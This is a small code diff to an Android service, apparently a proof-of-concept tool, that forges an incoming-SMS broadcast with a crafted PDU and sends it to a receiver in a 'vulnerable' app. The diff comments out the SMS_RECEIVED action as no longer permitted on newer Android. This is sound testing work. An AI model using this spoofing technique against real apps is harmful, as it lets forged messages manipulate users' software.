@@ -108,7 +108,8 @@ public class InjectSMSService extends IntentService {
         Intent intent = new Intent();
         intent.setClassName("uploaddata.example.com.uploaddataapp",
                 "SMSReceiver"); // Replace with name of vulnerable package & receiver.
-        intent.setAction("android.provider.Telephony.SMS_RECEIVED");
+        // No longer allowed in latest versions of Android
+        // intent.setAction("android.provider.Telephony.SMS_RECEIVED");
         intent.putExtra("pdus", new Object[] { pdu });
         intent.putExtra("format", "3gpp");
         context.sendBroadcast(intent);
